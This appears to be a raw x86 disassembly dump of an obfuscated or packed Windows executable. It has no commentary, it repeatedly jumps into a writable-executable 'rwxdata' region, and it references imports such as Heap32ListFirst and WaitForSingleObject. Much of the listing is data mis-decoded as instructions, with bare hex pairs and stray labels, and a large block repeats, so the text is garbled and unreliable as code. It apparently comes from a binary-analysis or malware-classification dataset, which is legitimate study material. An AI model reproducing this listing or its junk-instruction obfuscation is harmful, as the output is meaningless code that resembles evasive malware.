jne rwxdata
insd
add cl ch
mov dh 0x19
add esp eax
push esi
std
jle rwxdata
add [ eax ] al
insd
push esp
imul ebp [ ebp + 0x65 ] 0x19b6e900
mov edi [ esp + 0x8 ]
call sub_5160ed
add [ eax ] al
inc edi
je rwxdata
mov ecx 0x791c83a5
je rwxdata
jb rwxdata
jbe rwxdata
cmp edi [ ecx - 0x6278c946 ]
je rwxdata
retn 0xd248
push edi
mov edi ecx
mov ebx [ esp + 0x4 ]
arpl [ eax + eax + 0x66 ] si
adc esi edx
btc ax 0x1
aaa
mov esi edi
add ah 0xd5
shld eax ebx 0x15
mov eax [ edx + 0xc ]
call sub_4ba26d
jmp rwxdata
popad
insd
inc ecx
add [ eax + 0x72 ] ch
sbb al 0x13
ja rwxdata
dec eax
pop edi
pop edi
je rwxdata
adc eax 0x4d9c0a5a
in eax dx
std
dec eax
popad
jae rwxdata
sbb al 0xfb
adc [ eax ] eax
xor [ ecx + edx ] bl
cmc
test al 0xb
add [ ecx - 0x60 ] dh
or eax [ eax ]
sub [ ebp + 0x5caf000b ] esp
adc [ eax ] eax
test [ edi + 0x11 ] dh
add bh ch
pop esp
adc [ eax ] eax
outsb
dec esi
adc [ eax ] eax
aam 0xa6
or eax [ eax ]
mov [ ecx + edx ] ch
in al dx
push esp
adc [ eax ] eax
mov [ esi + 0x46b6000b ] fs
adc [ eax ] eax
out dx eax
mov [ 0x6304000b ] eax
adc [ eax ] eax
inc edi
mov al [ 0xffffffffa40d000b ]
or eax [ eax ]
mov eax 0x3e001164
push 0xab0e0011
or eax [ eax ]
and eax 0x5a00115e
jl Heap32ListFirst@IAT
popad
imul ebp [ esi + 0x61 ] 0x736772
push 0x1ac010d0
call sub_518ef7
cmp al 0x30
std
0xfdc0953a 0x7610
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
cli
arpl [ ecx ] dx
add [ ebp + 0x64 ] cl
adc [ eax ] eax
popad
mov al [ 0x6435000b ]
adc [ eax ] eax
cmp ebp [ esi + 0x11 ]
add [ ecx + edi * 2 + 0x560b0011 ] dh
adc [ eax ] eax
das
jge GetSystemTime@IAT
add [ ecx + 0x56 ] al
adc [ eax ] eax
pop edi
adc [ eax ] ax
and [ edx + 0x6b06000b ] 0x11
add dl bh
xor ah [ esi - 0x5a ]
int3
jae rwxdata
pop ds
dec esi
adc [ eax ] eax
mov eax [ 0x6b000ba6 ]
mov [ 0xfffffffffed3000b ] eax
or al 0x0
xlat
mov [ 0x11ee000b ] eax
or eax 0x11662600
add bh al
pop ecx
adc [ eax ] eax
adc al 0x5a
adc [ eax ] eax
lds esp [ eax + 0x11 ]
add [ ebx - 0x2affeeac ] bh
pushad
adc [ eax ] eax
dec esi
ror [ eax + eax ] 0x1
push cs
stosb [ edi ]
or eax [ eax ]
cmp [ ebx + 0x75f2000b ] ebp
adc [ eax ] eax
add al 0x7d
adc [ eax ] eax
aas
mov [ 0x7759000b ] al
adc [ eax ] eax
mov eax 0x85000ba6
into
add [ esp ] cl
adc [ eax ] eax
jg rwxdata
jbe rwxdata
jb rwxdata
add [ ecx + 0x11 ] ebx
add [ edx ] ch
dec [ eax + eax ]
add [ eax + 0x29001153 ] ah
push esp
adc [ eax ] eax
pop edx
test eax 0x5933000b
adc [ eax ] eax
js WaitForSingleObject@IAT
add [ ebp - 0x28fff332 ] al
adc [ eax ] eax
lodsd [ esi ]
movsd [ edi ] [ esi ]
or eax [ eax ]
je CreateEventA@IAT
je __import_name_6(MSVCRT:__getmainargs)
mov ecx 0x9d8736ba
push esp
add [ eax ] dl
inc ebx
or al 0x0
xlat
or eax [ eax ]
hlt
cmp [ esi + 0x11 ] edx
add cl al
adc [ 0x115c3e00 ] ecx
add [ edx - 0x2f ] al
or al 0x0
aaa
test al 0xb
add [ edx + 0x5a ] dh
adc [ eax ] eax
cmp dh [ ecx + 0x11 ]
add [ eax ] al
add [ eax ] al
add ch cl
arpl [ ecx ] dx
add [ eax + 0x76001177 ] ch
dec esp
adc [ eax ] eax
pop ecx
adc [ eax ] eax
mov [ esi + 0x11 ] gs
add [ ebx + ecx * 2 ] al
adc [ eax ] eax
jg rwxdata
xor ebx [ ecx + 0x11 ]
add [ ecx ] al
pop ecx
adc [ eax ] eax
sub bh bh
or al 0x0
adc [ eax ] eax
sub_4cfe87
clc
add [ edi + ebx ] dx
push edx
push edi
lea esp [ esp + 0x14 ]
jmp rwxdata
cmp dh ah
bt ax ax
add esi 0x2
jmp rwxdata
pushad
jmp rwxdata
pushfd
dec ecx
call sub_4baa7e
add [ eax ] al
pop edi
popad
jne rwxdata
sub bl [ edx ]
lea ecx [ ebx - 0x74fd2acb ]
rcr [ cs : ebx + 0x1a ] cl
pop eax
rwxdata
insb
jae rwxdata
arpl [ ebp + 0x70 ] bp
add [ eax ] al
add [ ebx + 0x74 ] dh
jb rwxdata
js rwxdata
jb rwxdata
and al 0x40
je rwxdata
lahf
retn
inc ebx
or cl [ ebx - 0x52 ]
call sub_5149a7
push 0x2ac01081
call sub_518563
jmp rwxdata
jmp rwxdata
and al 0x40
add [ eax - 0x2 ] ah
enter 0x9f0f 0xc3
pushad
ror bl cl
mov [ esp + 0x8 ] 0x24
ror al 0x6
pushfd
push 0x3db5ced4
stosb [ edi ]
mov bl ch
mov bl 0x2
lea esp [ esp + 0x4c ]
pushad
pushfd
lea esp [ esp + 0x24 ]
call sub_514aff
pushfd
push [ esp ]
lea esp [ esp + 0x8 ]
jae rwxdata
mov bl 0x4a
setb bl
mov bl al
inc ecx
push esi
dec bl
pushfd
inc ecx
add esp 0x8
not bl
test dh 0x55
xchg ebp eax
daa
clc
mov eax ebp
pushad
add bl ah
mov bl 0x1
sub esp 0xffffffe0
mov al ch
mov al cl
lodsb [ esi ]
not bl
cmc
not al
jmp rwxdata
pushfd
pushfd
stc
sub ecx ecx
jmp rwxdata
cmp di 0xba02
cmp si sp
push esi
ror si cl
pushad
mov esi edi
call sub_51578e
add [ eax ] al
dec esi
je rwxdata
push 0xf9efd1ed
mov [ esp ] bp
pushad
mov [ esp + 0x20 ] esi
shr esi cl
lea esi [ eax * 2 - 0x2888c866 ]
mov esi edi
push [ esp ]
call sub_515aa3
ror al 0x2
call sub_515d7b
add [ eax ] al
pop edi
imul ebp [ edi + 0x62 ] 0x7ae96000
lea esp [ esp + 0x8 ]
mov ebx [ esi ]
bt esp 0x10
clc
stc
clc
and ebx 0xfff
cmp ah 0x4e
pushfd
stc
clc
add [ edi + ebx ] edx
sub esp 0xfffffff8
imul ebp [ edi + 0x73 ] 0x5ce06100
cmc
fidiv [ ebp - 0x3914778 ]
pop esp
pushad
lea esp [ esp + 0x20 ]
jae rwxdata
inc ecx
and esi ebp
je rwxdata
and al 0x45
shl [ edi - 0x64 ] 0x3c
bound edi [ eax + edx * 4 + 0xe ]
out dx eax
xchg [ esi ] ch
lea ecx [ edx ]
mov eax [ 0xffffffffff43e6e3 ]
mov esp 0x4ece65cb
shl [ edx - 0xd ] cl
jb rwxdata
pushad
lea esp [ esp + 0x20 ]
call sub_516816
push 0x2f36ccdf
push ebx
sub ecx ebx
push [ esp ]
call sub_514f1a
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x466c6175
jb rwxdata
call sub_4ba562
pushfd
call sub_514bca
add [ eax ] al
push edx
jo rwxdata

test al 0xf7
scasb [ edi ]
retn 0xc088
add [ eax ] al
add al al
add [ edx + esi * 8 + 0x14 ] esp
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
scasb [ edi ]
mov cl dh
loopne rwxdata
inc ebp
js rwxdata
add al 0xae
jb rwxdata
sub al 0x4
add [ eax ] al
loopne rwxdata
pop ecx
aas
or al 0x0
add [ eax ] al
add dh al
or esi ebx
adc [ fs : edx + 0x3f ] 0x58
add [ eax ] eax
add [ eax + 0xc ] dl
mov edi edx
sub al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
add [ edi + 0x2264fcdc ] ah
pop ecx
aas
clc
push eax
push [ esp + 0x4 ]
xchg [ esp + 0x8 ] ebp
sub bp dx
shl ebp cl
lea ebp [ esp + 0x8 ]
stc
push [ esp ]
bt esi 0x2
cmp esp ecx
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] 0x6b
mov [ esp + 0x4 ] ebx
cmc
bt dx 0x1
or eax eax
call sub_4d126d
lodsb [ esi ]
pushfd
not al
clc
jmp rwxdata
lea eax [ 0x0 ]
mov [ esp ] 0x35
mov [ esp + 0x3c ] rwxdata
jmp rwxdata
pop [ esp + 0x1c ]
pushad
push [ esp ]
jmp rwxdata
clc
inc ebp
jbe rwxdata
inc ebx
aas
out 0x0 eax
add [ eax ] al
jmp rwxdata
salc
clc
hlt
cmc
mov [ esp ] 0x4a54
ror al 0x2
mov [ esp + 0x4 ] bh
dec al
jmp rwxdata
push 0x21193420
call sub_4ba009
add [ eax ] al
inc ebx
jb rwxdata
xchg [ eax - 0x64 ] bl
and [ esi - 0x39 ] ah
inc esp
and al 0x4
scasb [ edi ]
outsb
je rwxdata
jbe rwxdata
cmc
cmc
stc
ror al 0x6
lea esp [ esp + 0x2c ]
jne rwxdata
add [ ebx - 0x5afb46d0 ] ch
jo rwxdata
cdq
xlat
movsb [ edi ] [ esi ]
neg [ ecx - 0x279cc9c7 ]
add [ eax ] al
ja rwxdata
add al ch
out dx al
mov dl 0xfb
jmp [ esi - 0x39 ]
add [ eax ] cl
xor eax 0x7d9bf9ac
lodsd [ esi ]
shl al 0x7c
in al dx
je rwxdata
pop esi
aas
or [ esp + eax ] 0x7
dec ebx
out 0xf2 eax
mov bl 0xf3
inc ebx
aas
cmp eax 0x90000008
pop ss
sub al 0xf1
loopne rwxdata
call sub_4cfe42
mov [ esp ] 0x4e50
add dl dl
lea esp [ esp + 0x4 ]
js rwxdata
call j_sub_51680a
pushfd
mov [ esp ] 0xc4ad
cmp eax 0x7d00
pushfd
pushad
lea esp [ esp + 0x28 ]
jae rwxdata
jmp rwxdata
outsb
inc esp
arpl [ gs : edx + 0x79 ] si
jo rwxdata
je rwxdata
jae rwxdata
mov es sp
pop ss
add eax 0x830ad99d
xchg edi eax
cwde
mov al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
inc ecx
idiv ch
leave
inc ebx
aas
jmp rwxdata
pushfd
push [ esp ]
push 0x42e22958
lea esp [ esp + 0xc ]
jne rwxdata
stc
pushfd
call sub_4cd0f5
sub [ ebp - 0x282051e4 ] bh
in al dx
xchg edx eax
stosd [ edi ]
xor [ ecx + 0x32f1a504 ] bh
int1
xor ah [ eax - 0x51a37b79 ]
add al 0xa5
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
je rwxdata
popad
jo rwxdata
je rwxdata
xor al 0xfd
movsd [ edi ] [ esi ]
dec esi
push edi
div [ 0x69d36210 ]
fsubr [ ebp - 0x5809edc ]
mov ecx 0xa2c3bbf9
enter 0x5d3f 0x2f
test edx 0xeb93f012
mov ch 0x27
push 0xffffffda
add [ eax ] al
imul esi [ ebx + 0x73 ] 0x65636170
add [ 0x7f ] bh
push ecx
pushfd
call sub_4d11bc
add [ eax ] al
pop edi
popad
insb
insb
imul esi [ fs : esi ] 0x52c3980f
mov bl 0x2
push 0xe370dce6
push eax
jmp rwxdata
mov [ 0xfffffffff274f6d5 ] al
sub bh [ cs : edi ]
jle rwxdata
add [ eax ] al
add ah ah
inc ebp
xor al [ fs : ebx + 0x3f ]
add [ edx ] al
add [ eax ] al
loopne rwxdata
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
pushfd
push [ esp + 0x4 ]
retn 0x8
jmp rwxdata
inc ebx
push edx
push esp
insb
imul ebp [ esi + 0x64 ] 0x4473776f
imul esi [ edx + 0x65 ] 0x726f7463
jns rwxdata
mov ah 0x5a
0xaf298232 0x972a
into
sub ebx esi
0xa7d209b5 0x53f4
jb rwxdata
add [ eax ] al
add [ edi + 0x65 ] al
pop edi
je rwxdata
out 0x42 al
in eax 0x54
test [ ebx ] eax
js rwxdata
add [ eax ] al
add [ ebx + 0x70 ] dh
jb rwxdata
inc ecx
push [ esp + 0x8 ]
pushfd
mov al 0x10
pushfd
jmp rwxdata
inc edx
sahf
imul [ ebp + 0x1d88a34f ]
nop
jo rwxdata
push cs
je rwxdata
or [ eax ] al
add [ eax ] al
in al 0x45
mov edi ebx
nop
stc
inc ebx
aas
test [ ebx ] 0x0
add [ eax + 0x38f2d8fc ] ah
pop ecx
aas
or al 0x0
add [ eax ] al
add dl ch
pop esi
stc
enter 0x5926 0x3f
or al 0x0
add [ eax ] al
inc eax
lds edi [ edx - 0x7 ]
cmp [ ebx + 0x3c3f52 ] al
add [ eax ] al
xor [ edx - 0x6 ] dl
cld
les eax [ ebx + 0x1483f52 ]
add [ eax ] al
pushad
pushf
pop [ esp + 0x1e ]
pushfd
not dl
rcl dl cl
mov dl [ esi ]
jmp rwxdata
call sub_5160c0
fdivr [ eax - 0x29 ]
pop ebp
0x2c6efc40 0xba31
int3
jbe rwxdata
lodsd [ esi ]
add eax 0x56534d00
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
mov esp 0x830d700a
and cl ch
jmp rwxdata
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
jo rwxdata
scasd [ edi ]
sub dl [ edi - 0x150cd632 ]
mov ch 0x9
shl [ edi + 0x482053f4 ] cl
xor eax 0xc663e665
jpo rwxdata
inc ebx
add [ ebp + 0x5 ] cl
add dh al
add al 0x24
xor eax 0x3c2444c7
xor ch [ eax + 0x51 ]
add cl ch
inc edi
pop esp
cli
dec [ ebx - 0x14 ]
inc edi
0x859c
add [ eax ] al
jo rwxdata
jae rwxdata
test ecx ecx
rcl [ 0x2b41ffdc ] cl
cmp eax 0xf8ddff8a
mov ebp 0x64e42207
0xd9ba
hlt
outsb
je rwxdata
mov [ esp + 0x4 ] ch
pushad
pop ecx
aas
or al 0x0
add [ eax ] al
shr dl 0x34
clc
pushfd
cli
push ebp
lahf
adc ecx ebx
into
pop edx
test [ edi + 0x4086c7ea ] eax
js rwxdata
not dl
mov [ esp ] 0x7
ror dl 0x2
pushfd
push 0xe79e7e8c
dec dl
bt sp bx
clc
push [ esp + 0x8 ]
ror dl 0x6
std
bt ax bx
cmc
push [ esp + 0x2e ]
popf
pushfd
mov [ esp ] 0x3f
inc esi
jmp rwxdata
mov bl 0x2
push 0xbc73fcd6
push 0xb25f2b2b
inc al
inc ecx
jmp rwxdata
je rwxdata
outsb
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
insb
jbe rwxdata
je rwxdata
jpe rwxdata
je rwxdata
add [ ecx ] edi
add [ esi + 0x70 ] ah
jne rwxdata
add cl dl
push edi
shr [ eax - 0x31 ] 0x40
jb rwxdata
push [ ebp - 0x8 ]
add [ eax - 0x77 ] ah
inc esp
and al 0x20
mov [ esp + 0x4 ] 0x86ae
pop eax
pushfd
outsb
inc esp
jae rwxdata
jb rwxdata
sub bh [ edi ]
rol [ ecx ] 0x15
adc dl dl
mov [ esp ] bl
pushfd
push esp
pushfd
push [ esp + 0x40 ]
retn 0x44
pushad
jmp rwxdata
jae rwxdata
arpl [ ebp + 0x43 ] sp
popad
jo rwxdata
call sub_514aff
jmp rwxdata
add al 0x51
add [ edi + 0x18 ] eax
imul esi [ 0x24648db4 ] 0x8
inc ecx
xor [ ebx - 0x50c87ee4 ] eax
sub ch cl
mov esp 0xbcaf27cd
or cl al
cdq
popfd
sbb ch bl
xchg edi eax
je rwxdata
arpl [ eax ] ax
add [ eax ] al
inc edi
je rwxdata
0xda80
je rwxdata
mov al 0x10
call sub_515d53
add [ eax ] al
jae rwxdata
outsd
pushfd
adc [ edx ] esi
xchg esi eax
imul edx ecx 0xa7c254e0
in al 0xcf
je rwxdata
xchg ecx eax
add [ ecx + ebp - 0x1 ] edi
add [ eax ] al
add [ esi + 0x66 ] ah
insb
jne rwxdata
setae [ 0xffffffffa81b6c87 ]
test [ ecx ] edi
fmul [ ecx - 0x7ed456cd ]
sahf
push ss
scasd [ edi ]
shr esp 0x1
or [ ecx + 0x3a ] esp
jo rwxdata
out dx al
adc [ eax ] eax
add [ edi - 0x77 ] dl
iretd
jb rwxdata
scasb [ edi ]
add [ ebp + 0x7c019132 ] bl
sub edi edi
add al ch
or [ ebp + 0x534d0005 ] ebp
push esi
mov al [ 0xffffffffae5c8487 ]
dec ebp
aam 0x91
hlt
aad 0x4d
lea esp [ esp + 0x38 ]
call sub_514aff
pushad
adc al al
call sub_4ba21b
add [ eax ] al
dec edi
jo rwxdata
push 0x246c8800
add al 0x60
push eax
sbb cl [ esi - 0x29 ]
sahf
cwde
shr [ ebp + 0x32 ] 0x2c
imul edx [ esi - 0x80 ] 0xffffffd7
or [ ebx ] eax
jne rwxdata
dec esp
cmp ecx [ edx + 0x20 ]
imul eax [ ecx + edx * 2 ] 0x1
inc edi
sbb [ ebx + 0x35 ] ch
mov ah 0x8d
and al 0x8
pop ds
add [ eax ] al
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
jo rwxdata
jpe rwxdata
call sub_515ff7
lea edi [ ecx + 0x791c83a5 ]
and al 0x4
add [ eax ] al
add [ esi + 0x69 ] dl
jb rwxdata
je rwxdata
jns rwxdata
jne rwxdata
das
sahf
add eax 0x63fb557b
cwde
and al 0xa9
sub [ ebx - 0x78b248b7 ] 0x4409
cmp eax 0x7fb6fd05
popad
add al 0x78
outsd
insb
jne rwxdata
sbb ch [ ecx ]
pslld mm7 [ esi ]
add eax 0x3776657f
test al 0x87
inc ecx
inc eax
push ss
ja rwxdata
je rwxdata
test [ edi ] ebx
insb
push eax
jb rwxdata
inc ecx
add [ ebx - 0x21 ] dl
jne rwxdata
insd
add cl ch
mov dh 0x19
add esp eax
push esi
std
jle rwxdata
add [ eax ] al
insd
push esp
imul ebp [ ebp + 0x65 ] 0x19b6e900
mov edi [ esp + 0x8 ]
call sub_5160ed
add [ eax ] al
inc edi
je rwxdata
mov ecx 0x791c83a5
je rwxdata
jb rwxdata
jbe rwxdata
cmp edi [ ecx - 0x6278c946 ]
je rwxdata
retn 0xd248
push edi
mov edi ecx
mov ebx [ esp + 0x4 ]
arpl [ eax + eax + 0x66 ] si
adc esi edx
btc ax 0x1
aaa
mov esi edi
add ah 0xd5
shld eax ebx 0x15
mov eax [ edx + 0xc ]
call sub_4ba26d
jmp rwxdata
popad
insd
inc ecx
add [ eax + 0x72 ] ch
sbb al 0x13
ja rwxdata
dec eax
pop edi
pop edi
je rwxdata
adc eax 0x4d9c0a5a
in eax dx
std
dec eax
popad
jae rwxdata
sbb al 0xfb
adc [ eax ] eax
xor [ ecx + edx ] bl
cmc
test al 0xb
add [ ecx - 0x60 ] dh
or eax [ eax ]
sub [ ebp + 0x5caf000b ] esp
adc [ eax ] eax
test [ edi + 0x11 ] dh
add bh ch
pop esp
adc [ eax ] eax
outsb
dec esi
adc [ eax ] eax
aam 0xa6
or eax [ eax ]
mov [ ecx + edx ] ch
in al dx
push esp
adc [ eax ] eax
mov [ esi + 0x46b6000b ] fs
adc [ eax ] eax
out dx eax
mov [ 0x6304000b ] eax
adc [ eax ] eax
inc edi
mov al [ 0xffffffffa40d000b ]
or eax [ eax ]
mov eax 0x3e001164
push 0xab0e0011
or eax [ eax ]
and eax 0x5a00115e
jl Heap32ListFirst@IAT
popad
imul ebp [ esi + 0x61 ] 0x736772
push 0x1ac010d0
call sub_518ef7
cmp al 0x30
std
0xfdc0953a 0x7610
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
cli
arpl [ ecx ] dx
add [ ebp + 0x64 ] cl
adc [ eax ] eax
popad
mov al [ 0x6435000b ]
adc [ eax ] eax
cmp ebp [ esi + 0x11 ]
add [ ecx + edi * 2 + 0x560b0011 ] dh
adc [ eax ] eax
das
jge GetSystemTime@IAT
add [ ecx + 0x56 ] al
adc [ eax ] eax
pop edi
adc [ eax ] ax
and [ edx + 0x6b06000b ] 0x11
add dl bh
xor ah [ esi - 0x5a ]
int3
jae rwxdata
pop ds
dec esi
adc [ eax ] eax
mov eax [ 0x6b000ba6 ]
mov [ 0xfffffffffed3000b ] eax
or al 0x0
xlat
mov [ 0x11ee000b ] eax
or eax 0x11662600
add bh al
pop ecx
adc [ eax ] eax
adc al 0x5a
adc [ eax ] eax
lds esp [ eax + 0x11 ]
add [ ebx - 0x2affeeac ] bh
pushad
adc [ eax ] eax
dec esi
ror [ eax + eax ] 0x1
push cs
stosb [ edi ]
or eax [ eax ]
cmp [ ebx + 0x75f2000b ] ebp
adc [ eax ] eax
add al 0x7d
adc [ eax ] eax
aas
mov [ 0x7759000b ] al
adc [ eax ] eax
mov eax 0x85000ba6
into
add [ esp ] cl
adc [ eax ] eax
jg rwxdata
jbe rwxdata
jb rwxdata
add [ ecx + 0x11 ] ebx
add [ edx ] ch
dec [ eax + eax ]
add [ eax + 0x29001153 ] ah
push esp
adc [ eax ] eax
pop edx
test eax 0x5933000b
adc [ eax ] eax
js WaitForSingleObject@IAT
add [ ebp - 0x28fff332 ] al
adc [ eax ] eax
lodsd [ esi ]
movsd [ edi ] [ esi ]
or eax [ eax ]
je CreateEventA@IAT
je __import_name_6(MSVCRT:__getmainargs)
mov ecx 0x9d8736ba
push esp
add [ eax ] dl
inc ebx
or al 0x0
xlat
or eax [ eax ]
hlt
cmp [ esi + 0x11 ] edx
add cl al
adc [ 0x115c3e00 ] ecx
add [ edx - 0x2f ] al
or al 0x0
aaa
test al 0xb
add [ edx + 0x5a ] dh
adc [ eax ] eax
cmp dh [ ecx + 0x11 ]
add [ eax ] al
add [ eax ] al
add ch cl
arpl [ ecx ] dx
add [ eax + 0x76001177 ] ch
dec esp
adc [ eax ] eax
pop ecx
adc [ eax ] eax
mov [ esi + 0x11 ] gs
add [ ebx + ecx * 2 ] al
adc [ eax ] eax
jg rwxdata
xor ebx [ ecx + 0x11 ]
add [ ecx ] al
pop ecx
adc [ eax ] eax
sub bh bh
or al 0x0
adc [ eax ] eax
sub_4d11bc
jmp rwxdata
lea esp [ esp + 0x10 ]
ja rwxdata
not bl
test dh 0x55
xchg ebp eax
daa
clc
mov eax ebp
pushad
add bl ah
mov bl 0x1
sub esp 0xffffffe0
jmp rwxdata
cmp di 0xba02
cmp si sp
push esi
ror si cl
pushad
mov esi edi
call sub_51578e
add [ eax ] al
dec esi
je rwxdata
push 0xf9efd1ed
mov [ esp ] bp
pushad
mov [ esp + 0x20 ] esi
shr esi cl
lea esi [ eax * 2 - 0x2888c866 ]
mov esi edi
push [ esp ]
call sub_515aa3
mov bl 0x4a
setb bl
mov bl al
inc ecx
push esi
dec bl
pushfd
inc ecx
add esp 0x8
mov ebx [ esi ]
bt esp 0x10
clc
stc
clc
and ebx 0xfff
cmp ah 0x4e
pushfd
stc
clc
add [ edi + ebx ] edx
sub esp 0xfffffff8
cmp dh ah
bt ax ax
add esi 0x2
jmp rwxdata
imul ebp [ edi + 0x73 ] 0x5ce06100
cmc
fidiv [ ebp - 0x3914778 ]
pop esp
pushad
jmp rwxdata
inc ecx
and esi ebp
je rwxdata
and al 0x45
shl [ edi - 0x64 ] 0x3c
bound edi [ eax + edx * 4 + 0xe ]
out dx eax
xchg [ esi ] ch
lea ecx [ edx ]
mov eax [ 0xffffffffff43e6e3 ]
mov esp 0x4ece65cb
shl [ edx - 0xd ] cl
jb rwxdata
pushfd
dec ecx
call sub_4baa7e
add [ eax ] al
pop edi
popad
jne rwxdata

test al 0xf7
scasb [ edi ]
retn 0xc088
sub bl [ edx ]
lea ecx [ ebx - 0x74fd2acb ]
rcr [ cs : ebx + 0x1a ] cl
pop eax
rwxdata
insb
jae rwxdata
arpl [ ebp + 0x70 ] bp
add [ eax ] al
add [ ebx + 0x74 ] dh
jb rwxdata
js rwxdata
jb rwxdata
and al 0x40
je rwxdata
lahf
retn
inc ebx
or cl [ ebx - 0x52 ]
call sub_5149a7
push 0x2ac01081
call sub_518563
jmp rwxdata
and al 0x40
add [ eax - 0x2 ] ah
enter 0x9f0f 0xc3
pushad
ror bl cl
mov [ esp + 0x8 ] 0x24
ror al 0x6
pushfd
push 0x3db5ced4
stosb [ edi ]
mov bl ch
mov bl 0x2
lea esp [ esp + 0x4c ]
pushad
pushfd
lea esp [ esp + 0x24 ]
call sub_514aff
pushfd
push [ esp ]
lea esp [ esp + 0x8 ]
jae rwxdata
mov al ch
mov al cl
lodsb [ esi ]
not bl
cmc
not al
jmp rwxdata
pushfd
pushfd
stc
sub ecx ecx
jmp rwxdata
ror al 0x2
call sub_515d7b
add [ eax ] al
pop edi
imul ebp [ edi + 0x62 ] 0x7ae96000
lea esp [ esp + 0x8 ]
pushad
lea esp [ esp + 0x20 ]
jae rwxdata
pushad
lea esp [ esp + 0x20 ]
call sub_516816
push 0x2f36ccdf
push ebx
sub ecx ebx
push [ esp ]
call sub_514f1a
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x466c6175
jb rwxdata
call sub_4ba562
pushfd
call sub_514bca
add [ eax ] al
push edx
jo rwxdata
add [ eax ] al
add al al
add [ edx + esi * 8 + 0x14 ] esp
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
scasb [ edi ]
mov cl dh
loopne rwxdata
inc ebp
js rwxdata
add al 0xae
jb rwxdata
sub al 0x4
add [ eax ] al
loopne rwxdata
pop ecx
aas
or al 0x0
add [ eax ] al
add dh al
or esi ebx
adc [ fs : edx + 0x3f ] 0x58
add [ eax ] eax
add [ eax + 0xc ] dl
mov edi edx
sub al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
add [ edi + 0x2264fcdc ] ah
pop ecx
aas
clc
push eax
push [ esp + 0x4 ]
xchg [ esp + 0x8 ] ebp
sub bp dx
shl ebp cl
lea ebp [ esp + 0x8 ]
stc
push [ esp ]
bt esi 0x2
cmp esp ecx
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] 0x6b
mov [ esp + 0x4 ] ebx
cmc
bt dx 0x1
or eax eax
call sub_4d126d
lodsb [ esi ]
pushfd
not al
clc
jmp rwxdata
lea eax [ 0x0 ]
mov [ esp ] 0x35
mov [ esp + 0x3c ] rwxdata
jmp rwxdata
pop [ esp + 0x1c ]
pushad
push [ esp ]
jmp rwxdata
clc
inc ebp
jbe rwxdata
inc ebx
aas
out 0x0 eax
add [ eax ] al
jmp rwxdata
salc
clc
hlt
cmc
mov [ esp ] 0x4a54
ror al 0x2
mov [ esp + 0x4 ] bh
dec al
jmp rwxdata
push 0x21193420
call sub_4ba009
add [ eax ] al
inc ebx
jb rwxdata
xchg [ eax - 0x64 ] bl
and [ esi - 0x39 ] ah
inc esp
and al 0x4
scasb [ edi ]
outsb
je rwxdata
jbe rwxdata
cmc
cmc
stc
ror al 0x6
lea esp [ esp + 0x2c ]
jne rwxdata
add [ ebx - 0x5afb46d0 ] ch
jo rwxdata
cdq
xlat
movsb [ edi ] [ esi ]
neg [ ecx - 0x279cc9c7 ]
add [ eax ] al
ja rwxdata
add al ch
out dx al
mov dl 0xfb
jmp [ esi - 0x39 ]
add [ eax ] cl
xor eax 0x7d9bf9ac
lodsd [ esi ]
shl al 0x7c
in al dx
je rwxdata
pop esi
aas
or [ esp + eax ] 0x7
dec ebx
out 0xf2 eax
mov bl 0xf3
inc ebx
aas
cmp eax 0x90000008
pop ss
sub al 0xf1
loopne rwxdata
call sub_4cfe42
mov [ esp ] 0x4e50
add dl dl
lea esp [ esp + 0x4 ]
js rwxdata
call j_sub_51680a
pushfd
mov [ esp ] 0xc4ad
cmp eax 0x7d00
pushfd
pushad
lea esp [ esp + 0x28 ]
jae rwxdata
jmp rwxdata
outsb
inc esp
arpl [ gs : edx + 0x79 ] si
jo rwxdata
je rwxdata
jae rwxdata
mov es sp
pop ss
add eax 0x830ad99d
xchg edi eax
cwde
mov al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
inc ecx
idiv ch
leave
inc ebx
aas
jmp rwxdata
pushfd
push [ esp ]
push 0x42e22958
lea esp [ esp + 0xc ]
jne rwxdata
stc
pushfd
call sub_4cd0f5
sub [ ebp - 0x282051e4 ] bh
in al dx
xchg edx eax
stosd [ edi ]
xor [ ecx + 0x32f1a504 ] bh
int1
xor ah [ eax - 0x51a37b79 ]
add al 0xa5
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
je rwxdata
popad
jo rwxdata
je rwxdata
xor al 0xfd
movsd [ edi ] [ esi ]
dec esi
push edi
div [ 0x69d36210 ]
fsubr [ ebp - 0x5809edc ]
mov ecx 0xa2c3bbf9
enter 0x5d3f 0x2f
test edx 0xeb93f012
mov ch 0x27
push 0xffffffda
add [ eax ] al
imul esi [ ebx + 0x73 ] 0x65636170
add [ 0x7f ] bh
push ecx
pushfd
call sub_4d11bc
add [ eax ] al
pop edi
popad
insb
insb
imul esi [ fs : esi ] 0x52c3980f
mov bl 0x2
push 0xe370dce6
push eax
jmp rwxdata
mov [ 0xfffffffff274f6d5 ] al
sub bh [ cs : edi ]
jle rwxdata
add [ eax ] al
add ah ah
inc ebp
xor al [ fs : ebx + 0x3f ]
add [ edx ] al
add [ eax ] al
loopne rwxdata
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
pushfd
push [ esp + 0x4 ]
retn 0x8
jmp rwxdata
inc ebx
push edx
push esp
insb
imul ebp [ esi + 0x64 ] 0x4473776f
imul esi [ edx + 0x65 ] 0x726f7463
jns rwxdata
mov ah 0x5a
0xaf298232 0x972a
into
sub ebx esi
0xa7d209b5 0x53f4
jb rwxdata
add [ eax ] al
add [ edi + 0x65 ] al
pop edi
je rwxdata
out 0x42 al
in eax 0x54
test [ ebx ] eax
js rwxdata
add [ eax ] al
add [ ebx + 0x70 ] dh
jb rwxdata
inc ecx
